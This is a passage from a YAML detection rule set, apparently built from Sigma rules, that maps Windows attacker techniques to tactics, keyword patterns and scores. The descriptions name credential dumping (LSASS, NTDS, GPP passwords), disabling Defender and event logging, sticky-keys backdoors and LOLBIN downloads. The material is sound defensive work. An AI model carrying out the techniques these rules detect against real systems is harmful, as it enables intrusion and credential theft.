    This technique is sometimes used by malicious actors in order to redirect the
    output of reconnaissance commands such as "hostname" and "dir" to files for future
    exfiltration.

    '
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - shell
      - output
      - redirect
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c73124a7_3e89_44a3_bdc1_25fe4df754b1
  intent: impact_operations
  tactic: impact
  description: Detects the execution of the builtin "copy" command that targets a
    shadow copy (sometimes used to copy registry hives that are in use)
  conditions:
    summary:
      regex_any:
      - copy
      - from
      - volumeshadowcopy
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_241e802a_b65e_484f_88cd_c2dc10f9206d
  intent: execution
  tactic: execution
  description: Detect the use of "<" to read and potentially execute a file via cmd.exe
  conditions:
    summary:
      regex_any:
      - read
      - contents
      - from
      - stdin
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1070db9a_3e5d_412e_8e7b_7183b616e1b3
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: 'By replacing the sticky keys executable with the local admins CMD
    executable, an attacker is able to access a privileged windows console session
    without authenticating to the system.

    When the sticky keys are "activated" the privilleged shell is launched.

    '
  conditions:
    summary:
      regex_any:
      - persistence
      - sticky
      - backdoor
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2fdefcb3_dbda_401e_ae23_f0db027628bc
  intent: persistence_installation
  tactic: persistence
  description: Detects the usage and installation of a backdoor that uses an option
    to register a malicious debugger for built-in tools that are accessible in the
    login screen
  conditions:
    summary:
      regex_any:
      - sticky
      - like
      - backdoor
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_aa0b3a82_eacc_4ec3_9150_b5a9a3e3f82f
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects usage of the "type" command to download/upload data from WebDAV
    server
  conditions:
    summary:
      regex_any:
      - potential
      - download
      - upload
      - activity
      - using
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4b991083_3d0e_44ce_8fc4_b254025d8d4b
  intent: execution
  tactic: execution
  description: Detects suspicious parent process for cmd.exe
  conditions:
    summary:
      regex_any:
      - unusual
      - parent
      - process
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7d4cdc5a_0076_40ca_aac8_f7e714570e47
  intent: unknown
  tactic: g0069
  description: Detects various indicators of Microsoft Connection Manager Profile
    Installer execution
  conditions:
    summary:
      regex_any:
      - cmstp
      - execution
      - process
      - creation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1f0f6176_6482_4027_b151_00071af39d7e
  intent: data_exfiltration
  tactic: exfiltration
  description: 'Detects the execution of "ConfigSecurityPolicy.EXE", a binary part
    of Windows Defender used to manage settings in Windows Defender.

    Users can configure different pilot collections for each of the co-management
    workloads.

    It can be abused by attackers in order to upload or download files.

    '
  conditions:
    summary:
      regex_any:
      - arbitrary
      - file
      - download
      - configsecuritypolicy
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_056c7317_9a09_4bd4_9067_d051312752ea
  intent: execution
  tactic: execution
  description: 'Detects the use of powershell commands from headless ConHost window.

    The "--headless" flag hides the windows from the user upon execution.

    '
  conditions:
    summary:
      regex_any:
      - powershell
      - executed
      - from
      - headless
      - conhost
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ee5e119b_1f75_4b34_add8_3be976961e39
  intent: execution
  tactic: execution
  description: detects the usage of path traversal in conhost.exe indicating possible
    command/argument confusion/hijacking
  conditions:
    summary:
      regex_any:
      - conhost
      - commandline
      - path
      - traversal
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7dc2dedd_7603_461a_bc13_15803d132355
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects uncommon "conhost" child processes. This could be a sign of
    "conhost" usage as a LOLBIN or potential process injection activity.
  conditions:
    summary:
      regex_any:
      - uncommon
      - child
      - process
      - conhost
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_dfa03a09_8b92_4d83_8e74_f72839b1c407
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects suspicious child processes related to Windows Shell utilities
    spawned by `conhost.exe`, which could indicate malicious activity using trusted
    system components.
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - child
      - processes
      - spawned
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_cbb9e3d1_2386_4e59_912e_62f1484f7a89
  intent: execution
  tactic: execution
  description: Detects when the Console Window Host (conhost.exe) process is spawned
    by an uncommon parent process, which could be indicative of potential code injection
    activity.
  conditions:
    summary:
      regex_any:
      - conhost
      - spawned
      - uncommon
      - parent
      - process
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0ba863e6_def5_4e50_9cea_4dd8c7dc46a4
  intent: persistence_installation
  tactic: persistence
  description: Detects the malicious use of a control panel item
  conditions:
    summary:
      regex_any:
      - control
      - panel
      - items
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_515c8be5_e5df_4c5e_8f6d_a4a2f05e4b48
  intent: credential_harvesting
  tactic: credential_access
  description: Detects uses of the createdump.exe LOLOBIN utility to dump process
    memory
  conditions:
    summary:
      regex_any:
      - createdump
      - process
      - dump
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_dcaa3f04_70c3_427a_80b4_b870d73c94c4
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects execution of "csc.exe" to compile .NET code. Attackers often
    leverage this to compile code on the fly and use it in other stages.
  conditions:
    summary:
      regex_any:
      - dynamic
      - compilation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b730a276_6b63_41b8_bcf8_55930c8fc6ee
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects a potentially suspicious parent of "csc.exe", which could be
    a sign of payload delivery.
  conditions:
    summary:
      regex_any:
      - execution
      - form
      - potentially
      - suspicious
      - parent
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_40b95d31_1afc_469e_8d34_9a3a667d058e
  intent: defense_evasion
  tactic: defense_evasion
  description: Csi.exe is a signed binary from Microsoft that comes with Visual Studio
    and provides C# interactive capabilities. It can be used to run C# code from a
    file passed as a parameter in command line. Early version of this utility provided
    with Microsoft Roslyn Community Technology Preview was named 'rcsi.exe'
  conditions:
    summary:
      regex_any:
      - suspicious
      - usage
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a9e416a8_e613_4f8b_88b8_a7d1d1af2f61
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the execution of CSharp interactive console by PowerShell
  conditions:
    summary:
      regex_any:
      - suspicious
      - csharp
      - interactive
      - console
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e5d36acd_acb4_4c6f_a13f_9eb203d50099
  intent: reconnaissance
  tactic: discovery
  description: Detects the execution of "csvde.exe" in order to export organizational
    Active Directory structure.
  conditions:
    summary:
      regex_any:
      - active
      - directory
      - structure
      - export
      - csvde
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5a6e1e16_07de_48d8_8aae_faa766c05e88
  intent: execution
  tactic: execution
  description: Detects execution of "curl.exe" with the "-c" flag in order to save
    cookie data.
  conditions:
    summary:
      regex_any:
      - potential
      - cookies
      - session
      - hijacking
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_85de1f22_d189_44e4_8239_dc276b45379b
  intent: execution
  tactic: execution
  description: Detects execution of "curl.exe" with a potential custom "User-Agent".
    Attackers can leverage this to download or exfiltrate data via "curl" to a domain
    that only accept specific "User-Agent" strings
  conditions:
    summary:
      regex_any:
      - curl
      - request
      - with
      - potential
      - custom
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9cc85849_3b02_4cb5_b371_3a1ff54f2218
  intent: execution
  tactic: execution
  description: Detects file downloads directly from IP address URL using curl.exe
  conditions:
    summary:
      regex_any:
      - file
      - download
      - from
      - curl
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_5cb299fc_5fb1_4d07_b989_0644c68b6043
  intent: execution
  tactic: execution
  description: Detects potentially suspicious file downloads directly from IP addresses
    using curl.exe
  conditions:
    summary:
      regex_any:
      - suspicious
      - file
      - download
      - from
      - curl
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_56454143_524f_49fb_b1c6_3fb8b1ad41fb
  intent: execution
  tactic: execution
  description: Detects potentially suspicious file download from file sharing domains
    using curl.exe
  conditions:
    summary:
      regex_any:
      - suspicious
      - file
      - download
      - from
      - file
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_cb9cc1d1_e84e_4bdc_b7ad_c31b1b7908ec
  intent: execution
  tactic: execution
  description: Detects execution of "curl.exe" with the "--insecure" flag.
  conditions:
    summary:
      regex_any:
      - insecure
      - transfer
      - curl
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2c1486f5_02e8_4f86_9099_b97f2da4ed77
  intent: execution
  tactic: execution
  description: Detects execution of "curl.exe" with the "insecure" flag over proxy
    or DOH.
  conditions:
    summary:
      regex_any:
      - insecure
      - proxy
      - transfer
      - curl
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_aa6f6ea6_0676_40dd_b510_6e46f02d8867
  intent: execution
  tactic: execution
  description: Detects execution of "curl.exe" with the "file://" protocol handler
    in order to read local files.
  conditions:
    summary:
      regex_any:
      - local
      - file
      - read
      - using
      - curl
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e218595b_bbe7_4ee5_8a96_f32a24ad3468
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects a suspicious curl process start on Windows and outputs the
    requested document to a local file
  conditions:
    summary:
      regex_any:
      - suspicious
      - curl
      - download
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6345b048_8441_43a7_9bed_541133633d7a
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the execution of "dctask64.exe", a signed binary by ZOHO Corporation
    part of ManageEngine Endpoint Central.

    This binary can be abused for DLL injection, arbitrary command and process execution.

    '
  conditions:
    summary:
      regex_any:
      - manageengine
      - endpoint
      - central
      - dctask64
      - potential
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b2309017_4235_44fe_b5af_b15363011957
  intent: execution
  tactic: execution
  description: Detects uncommon child processes of "DefaultPack.EXE" binary as a proxy
    to launch other programs
  conditions:
    summary:
      regex_any:
      - uncommon
      - child
      - process
      - defaultpack
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1e8a9b4d_3c2a_4f9b_8d1e_7c6a5b4f3d2e
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the use of PowerShell to execute the ''Set-MpPreference''
    cmdlet to configure Windows Defender''s threat severity default action to ''Allow''
    (value ''6'') or ''NoAction'' (value ''9'').

    This is a highly suspicious configuration change that effectively disables Defender''s
    ability to automatically mitigate threats of a certain severity level.

    An attacker might use this technique via the command line to bypass defenses before
    executing payloads.

    '
  conditions:
    summary:
      regex_any:
      - powershell
      - defender
      - threat
      - severity
      - default
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b9e8c7d6_a5f4_4e3d_8b1a_9f0c8d7e6a5b
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the use of reg.exe or PowerShell to delete the Windows Defender
    context menu handler registry keys.

    This action removes the "Scan with Microsoft Defender" option from the right-click
    menu for files, directories, and drives.

    Attackers may use this technique to hinder manual, on-demand scans and reduce
    the visibility of the security product.

    '
  conditions:
    summary:
      regex_any:
      - windows
      - defender
      - context
      - menu
      - removed
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_214641c2_c579_4ecb_8427_0cf19df6842e
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects the desktopimgdownldr utility being used to download a remote
    file. An adversary may use desktopimgdownldr to download arbitrary files as an
    alternative to certutil.
  conditions:
    summary:
      regex_any:
      - remote
      - file
      - download
      - desktopimgdownldr
      - utility
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_bb58aa4a_b80b_415a_a2c0_2f65a4c81009
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects a suspicious Microsoft desktopimgdownldr execution with parameters
    used to download files from the Internet
  conditions:
    summary:
      regex_any:
      - suspicious
      - desktopimgdownldr
      - command
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e173ad47_4388_4012_ae62_bd13f71c18a8
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the use of the PhoneDeepLink parameter to potentially sideload
    a DLL file that does not exist. This non-existent DLL file is named "ShellChromeAPI.dll".

    Adversaries can drop their own renamed DLL and execute it via DeviceEnroller.exe
    using this parameter

    '
  conditions:
    summary:
      regex_any:
      - potential
      - sideloading
      - deviceenroller
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_90d50722_0483_4065_8e35_57efaadd354d
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects a certain command line flag combination used by "devinit.exe",
    which can be abused as a LOLBIN to download arbitrary MSI packages on a Windows
    system
  conditions:
    summary:
      regex_any:
      - arbitrary
      - download
      - devinit
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_67bc0e75_c0a9_4cfc_8754_84a505b63c04
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects potentially suspicious child processes of a ClickOnce deployment
    application
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - child
      - process
      - clickonce
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9f546b25_5f12_4c8d_8532_5893dcb1e4b8
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects potentially suspicious child processes of "Diskshadow.exe".
    This could be an attempt to bypass parent/child relationship detection or application
    whitelisting rules.
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - child
      - process
      - diskshadow
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1dde5376_a648_492e_9e54_4241dd9b0c7f
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects execution of "Diskshadow.exe" in script mode to execute an
    script with a potentially uncommon extension.

    Initial baselining of the allowed extension list is required.

    '
  conditions:
    summary:
      regex_any:
      - diskshadow
      - script
      - mode
      - uncommon
      - script
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fa1a7e52_3d02_435b_81b8_00da14dd66c1
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects execution of "Diskshadow.exe" in script mode using the "/s"
    flag where the script is located in a potentially suspicious location.
  conditions:
    summary:
      regex_any:
      - diskshadow
      - script
      - mode
      - execution
      - from
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7e8f2d3b_9c1a_4f67_b9e8_8d9006e0e51f
  intent: persistence_installation
  tactic: persistence
  description: Detects the use of DISM to enable the PowerShell Web Access feature,
    which could be used for remote access and potential abuse
  conditions:
    summary:
      regex_any:
      - powershell
      - access
      - feature
      - enabled
      - dism
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_43e32da2_fdd0_4156_90de_50dfd62636f9
  intent: defense_evasion
  tactic: defense_evasion
  description: Deployment Image Servicing and Management tool. DISM is used to enumerate,
    install, uninstall, configure, and update features and packages in Windows images
  conditions:
    summary:
      regex_any:
      - dism
      - remove
      - online
      - package
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e7888eb1_13b0_4616_bd99_4bc0c2b054b9
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects a "dllhost" process spawning with no commandline arguments
    which is very rare to happen and could indicate process injection activity or
    malware mimicking similar system processes.
  conditions:
    summary:
      regex_any:
      - dllhost
      - execution
      - anomaly
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ebea773c_a8f1_42ad_a856_00cb221966e8
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects execution of VMware Xfer utility (VMwareXferlogs.exe) from
    the non-default directory which may be an attempt to sideload arbitrary DLL
  conditions:
    summary:
      regex_any:
      - sideloading
      - vmware
      - xfer
      - utility
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b6457d63_d2a2_4e29_859d_4e7affc153d1
  intent: execution
  tactic: execution
  description: Detects an attempt to leverage dnscmd.exe to enumerate the DNS zones
    of a domain. DNS zones used to host the DNS records for a particular domain.
  conditions:
    summary:
      regex_any:
      - potential
      - discovery
      - activity
      - dnscmd
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f63b56ee_3f79_4b8a_97fb_5c48007e8573
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the installation of a DNS plugin DLL via ServerLevelPluginDll
    parameter in registry, which can be used to execute code in context of the DNS
    server (restart required)
  conditions:
    summary:
      regex_any:
      - serverlevelplugindll
      - installed
      - dnscmd
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_98a96a5a_64a0_4c42_92c5_489da3866cb0
  intent: command_and_control_setup
  tactic: command_and_control
  description: Well-known DNS Exfiltration tools execution
  conditions:
    summary:
      regex_any:
      - exfiltration
      - tunneling
      - tools
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a4e3d776_f12e_42c2_8510_9e6ed1f43ec3
  intent: unknown
  tactic: initial_access
  description: Detects an unexpected process spawning from dns.exe which may indicate
    activity related to remote code execution or other forms of exploitation as seen
    in CVE-2020-1350 (SigRed)
  conditions:
    summary:
      regex_any:
      - unusual
      - child
      - process
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_81ebd28b_9607_4478_bf06_974ed9d53ed7
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the execution of Dnx.EXE. The Dnx utility allows for the execution
    of C# code.

    Attackers might abuse this in order to bypass application whitelisting.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - application
      - whitelisting
      - bypass
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_53d8d3e1_ca33_4012_adf3_e05a4d652e34
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the execution of "dotnet-dump" with the "collect" flag. The
    execution could indicate potential process dumping of critical processes such
    as LSASS.

    '
  conditions:
    summary:
      regex_any:
      - process
      - memory
      - dump
      - dotnet
      - dump
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d80d5c81_04ba_45b4_84e4_92eba40e0ad3
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects execution of arbitrary DLLs or unsigned code via a ".csproj"
    files via Dotnet.EXE.
  conditions:
    summary:
      regex_any:
      - arbitrary
      - csproj
      - code
      - execution
      - dotnet
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9257c05b_4a4a_48e5_a670_b7b073cf401b
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects commandline arguments for executing a child process via dotnet-trace.exe
  conditions:
    summary:
      regex_any:
      - binary
      - proxy
      - execution
      - dotnet
      - trace
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9fc3072c_dc8f_4bf7_b231_18950000fadd
  intent: reconnaissance
  tactic: discovery
  description: Detect usage of the "driverquery" utility to perform reconnaissance
    on installed drivers
  conditions:
    summary:
      regex_any:
      - potential
      - recon
      - activity
      - using
      - driverquery
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a20def93_0709_4eae_9bd2_31206e21e6b2
  intent: reconnaissance
  tactic: discovery
  description: Detect usage of the "driverquery" utility. Which can be used to perform
    reconnaissance on installed drivers
  conditions:
    summary:
      regex_any:
      - driverquery
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_01c42d3c_242d_4655_85b2_34f1739632f7
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects usage of Dsacls to grant over permissive permissions
  conditions:
    summary:
      regex_any:
      - potentially
      - over
      - permissive
      - permissions
      - granted
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_bac9fb54_2da7_44e9_988f_11e9a5edbc0c
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects possible password spraying attempts using Dsacls
  conditions:
    summary:
      regex_any:
      - potential
      - password
      - spraying
      - attempt
      - using
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3bad990e_4848_4a78_9530_b427d854aac0
  intent: reconnaissance
  tactic: discovery
  description: Detects execution of "dsquery.exe" for domain trust discovery
  conditions:
    summary:
      regex_any:
      - domain
      - trust
      - discovery
      - dsquery
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7124aebe_4cd7_4ccb_8df0_6d6b93c96795
  intent: reconnaissance
  tactic: discovery
  description: Detects suspicious way to dump the kernel on Windows systems using
    dtrace.exe, which is available on Windows systems since Windows 10 19H1
  conditions:
    summary:
      regex_any:
      - suspicious
      - kernel
      - dump
      - using
      - dtrace
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_129966c9_de17_4334_a123_8b58172e664d
  intent: credential_harvesting
  tactic: credential_access
  description: 'Detects when a user is potentially trying to bypass the Windows Defender
    AV by renaming a tool to dump64.exe and placing it in the Visual Studio folder.

    Currently the rule is covering only usage of procdump but other utilities can
    be added in order to increase coverage.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - windows
      - defender
      - bypass
      - dump64
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_dee0a7a3_f200_4112_a99b_952196d81e42
  intent: credential_harvesting
  tactic: credential_access
  description: Detects the use of "DumpMinitool.exe" a tool that allows the dump of
    process memory via the use of the "MiniDumpWriteDump"
  conditions:
    summary:
      regex_any:
      - dumpminitool
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_eb1c4225_1c23_4241_8dd4_051389fde4ce
  intent: credential_harvesting
  tactic: credential_access
  description: Detects suspicious ways to use the "DumpMinitool.exe" binary
  conditions:
    summary:
      regex_any:
      - suspicious
      - dumpminitool
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_60f16a96_db70_42eb_8f76_16763e333590
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the execution of "DXCap.EXE" with the "-c" flag, which allows
    a user to launch any arbitrary binary or windows package through DXCap itself.
    This can be abused to potentially bypass application whitelisting.

    '
  conditions:
    summary:
      regex_any:
      - capture
      - session
      - launched
      - dxcap
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7df1713a_1a5b_4a4b_a071_dc83b144a101
  intent: unknown
  tactic: s0404
  description: Conti recommendation to its affiliates to use esentutl to access NTDS
    dumped file. Trickbot also uses this utilities to get MSEdge info via its module
    pwgrab.
  conditions:
    summary:
      regex_any:
      - esentutl
      - gather
      - credentials
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e7be6119_fc37_43f0_ad4f_1f3f99be2f9f
  intent: unknown
  tactic: s0404
  description: Files with well-known filenames (sensitive files with credential data)
    copying
  conditions:
    summary:
      regex_any:
      - copying
      - sensitive
      - files
      - with
      - credential
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6a69f62d_ce75_4b57_8dce_6351eb55b362
  intent: data_staging
  tactic: collection
  description: One way Qbot steals sensitive information is by extracting browser
    data from Internet Explorer and Microsoft Edge by using the built-in utility esentutl.exe
  conditions:
    summary:
      regex_any:
      - esentutl
      - steals
      - browser
      - information
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_be344333_921d_4c4d_8bb8_e584cf584780
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects uncommon or suspicious child processes of "eventvwr.exe" which
    might indicate a UAC bypass attempt
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - event
      - viewer
      - child
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1a4bd6af_99ac_4466_b5b2_7b72b4a05462
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects attempts to disable security event logging by adding the `MiniNt`
    registry key.

    This key is used to disable the Windows Event Log service, which collects and
    stores event logs from the operating system and applications.

    Adversaries may want to disable this service to prevent logging of security events
    that could be used to detect their activities.

    '
  conditions:
    summary:
      regex_any:
      - security
      - event
      - logging
      - disabled
      - minint
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9f107a84_532c_41af_b005_8d12a607639f
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the expansion or decompression of cabinet files from potentially
    suspicious or uncommon locations, e.g. seen in Iranian MeteorExpress related attacks
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - cabinet
      - file
      - expansion
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_949f1ffb_6e85_4f00_ae1e_c3c5b190d605
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects a command line process that uses explorer.exe to launch arbitrary
    commands or binaries,

    which is similar to cmd.exe /c, only it breaks the process tree and makes its
    parent a new instance of explorer spawning from "svchost"

    '
  conditions:
    summary:
      regex_any:
      - explorer
      - process
      - tree
      - break
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c3d76afc_93df_461e_8e67_9b2bad3f2ac4
  intent: reconnaissance
  tactic: discovery
  description: 'Detects the initial execution of "cmd.exe" which spawns "explorer.exe"
    with the appropriate command line arguments for opening the "My Computer" folder.

    '
  conditions:
    summary:
      regex_any:
      - file
      - explorer
      - folder
      - opened
      - using
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_534f2ef7_e8a2_4433_816d_c91bccde289b
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects suspicious starts of explorer.exe that use the /NOUACCHECK
    flag that allows to run all sub processes of that newly started explorer.exe without
    any UAC checks
  conditions:
    summary:
      regex_any:
      - explorer
      - nouaccheck
      - flag
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4be03877_d5b6_4520_85c9_a5911c0a656c
  intent: execution
  tactic: execution
  description: 'Detects potentially suspicious subprocesses such as LOLBINs spawned
    by web browsers. This activity could be associated with the "FileFix" social engineering
    technique,

    where users are tricked into launching the file explorer via a browser-based phishing
    page and pasting malicious commands into the address bar.

    The technique abuses clipboard manipulation and disguises command execution as
    benign file path access, resulting in covert execution of system utilities.

    '
  conditions:
    summary:
      regex_any:
      - filefix
      - suspicious
      - child
      - process
      - from
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_587254ee_a24b_4335_b3cd_065c0f1f4baa
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects execution of "findstr" with specific flags and a remote share
    path. This specific set of CLI flags would allow "findstr" to download the content
    of the file located on the remote share as described in the LOLBAS entry.

    '
  conditions:
    summary:
      regex_any:
      - remote
      - file
      - download
      - findstr
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_91a2c315_9ee6_4052_a853_6f6a8238f90d
  intent: credential_harvesting
  tactic: credential_access
  description: Look for the encrypted cpassword value within Group Policy Preference
    files on the Domain Controller. This value can be decrypted with gpp-decrypt.
  conditions:
    summary:
      regex_any:
      - findstr
      - passwords
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_33339be3_148b_4e16_af56_ad16ec6c7e7b
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects usage of findstr to identify and execute a lnk file as seen
    within the HHS redirect attack
  conditions:
    summary:
      regex_any:
      - findstr
      - launching
      - file
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fe63010f_8823_4864_a96b_a7b4a0f7b929
  intent: credential_harvesting
  tactic: credential_access
  description: Detects findstring commands that include the keyword lsass, which indicates
    recon actviity for the LSASS process PID
  conditions:
    summary:
      regex_any:
      - lsass
      - process
      - reconnaissance
      - findstr
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_47e4bab7_c626_47dc_967b_255608c9a920
  intent: credential_harvesting
  tactic: credential_access
